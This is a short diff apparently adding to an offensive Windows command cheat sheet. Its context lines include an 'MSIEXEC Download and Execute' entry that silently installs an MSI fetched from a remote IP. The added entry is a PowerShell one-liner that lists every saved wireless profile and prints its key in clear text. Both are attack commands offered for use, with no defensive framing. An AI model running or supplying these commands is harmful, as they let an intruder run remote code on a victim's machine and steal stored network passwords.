@@ -44,3 +44,5 @@ CERTUTIL Download and Execute
 MSIEXEC Download and Execute
 <pre><code>msiexec /q /i http://192.168.1.109/1.msi</pre></code>
 
+Grab all wireless passwords with PS
+<pre><code>(netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)} | Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} | Format-Table -AutoSize</pre></code>
